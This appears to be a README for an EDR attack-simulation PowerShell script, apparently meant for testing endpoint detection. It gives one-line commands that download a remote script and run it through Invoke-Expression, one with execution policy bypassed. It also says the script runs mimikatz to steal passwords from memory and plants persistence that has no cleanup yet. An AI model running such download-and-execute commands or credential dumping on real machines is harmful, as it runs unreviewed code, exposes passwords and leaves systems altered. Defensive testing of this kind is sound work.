## Datto EDR Behavioral Attack Simulator
**Platform:** Microsoft Windows 7+ or Server 2008+\
**Powershell Version:** 3.0+\
**.NET Version:** 4.5+

This script will execute several MITRE ATT&CK adversarial behaviors and add several footholds/Autoruns which are pointed at non-malware (calculator and cmd.exe).  The only malicous software run is mimikatz (steals passwords from memory) which will not persist.


The following command is all you need.  Run it on any windows system and it will download this script and execute it.  


> `[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1")`


### Example 2 (For use in batch or from cmd.exe):
If running from outside Powershell (like in cmd.exe or a batch script):
> `powershell.exe -ExecutionPolicy bypass -noprofile -nologo -command { [System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1") }`

### WARNING: This script will leave your system in a messy state. The cleanup script is not finished yet. Shouldn't cause a problem but expect random calculators and command prompts (our selected malware) to persist and return randomly.
